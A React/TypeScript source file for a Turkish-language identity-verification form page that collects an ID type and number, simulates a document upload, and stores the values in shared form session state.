import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Upload, FileText, CheckCircle } from 'lucide-react';
import FormLayout from '@/components/FormLayout';
import ErrorAlert from '@/components/ErrorAlert';
import { useForm } from '@/contexts/FormContext';

const DocumentsPage = () => {
  const [idType, setIdType] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [uploadStatus, setUploadStatus] = useState('pending');
  const { updateSessionData, setWaiting } = useForm();

  const handleFileUpload = () => {
    // Simulate file upload
    setUploadStatus('uploading');
    setTimeout(() => {
      setUploadStatus('complete');
    }, 2000);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    updateSessionData('documents', { idType, idNumber, uploadStatus });
    setWaiting(true);
  };

  return (
    <FormLayout 
      title="Belge Doğrulaması" 
      description="Kimlik belgelerinizi yükleyin"
    >
      <ErrorAlert />
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <Label htmlFor="idType">Kimlik Türü</Label>
          <Select value={idType} onValueChange={setIdType}>
            <SelectTrigger>
              <SelectValue placeholder="Kimlik türünü seçin" />
            </SelectTrigger>
            <SelectContent>
              <SelectItem value="passport">Pasaport</SelectItem>
              <SelectItem value="drivers_license">Ehliyet</SelectItem>
              <SelectItem value="national_id">T.C. Kimlik</SelectItem>
              <SelectItem value="other">Diğer</SelectItem>
            </SelectContent>
          </Select>
        </div>

        <div className="space-y-2">
          <Label htmlFor="idNumber">Kimlik Numarası</Label>
          <div className="relative">
            <FileText className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              id="idNumber"
              value={idNumber}
              onChange={(e) => setIdNumber(e.target.value)}
              className="pl-10"
              placeholder="Kimlik numaranızı girin"
              required
            />
          </div>
        </div>

        <div className="space-y-2">
          <Label>Belge Yükle</Label>
          <div className="border-2 border-dashed border-muted-foreground/25 rounded-lg p-4 text-center">
            {uploadStatus === 'pending' && (
              <div className="space-y-2">
                <Upload className="h-8 w-8 mx-auto text-muted-foreground" />
                <Button
                  type="button"
                  variant="outline"
                  onClick={handleFileUpload}
                >
                  Dosya Seç
                </Button>
                <p className="text-sm text-muted-foreground">PNG, JPG max 10MB</p>
              </div>
            )}
            {uploadStatus === 'uploading' && (
              <div className="space-y-2">
                <div className="h-8 w-8 mx-auto animate-spin rounded-full border-2 border-primary border-t-transparent" />
                <p className="text-sm text-muted-foreground">Yükleniyor...</p>
              </div>
            )}
            {uploadStatus === 'complete' && (
              <div className="space-y-2">
                <CheckCircle className="h-8 w-8 mx-auto text-success" />
                <p className="text-sm text-success">Yükleme tamamlandı</p>
              </div>
            )}
          </div>
        </div>

        <Button 
          type="submit" 
          className="w-full" 
          disabled={!idType || !idNumber || uploadStatus !== 'complete'}
        >
          Devam Et
        </Button>
      </form>
    </FormLayout>
  );
};

export default DocumentsPage;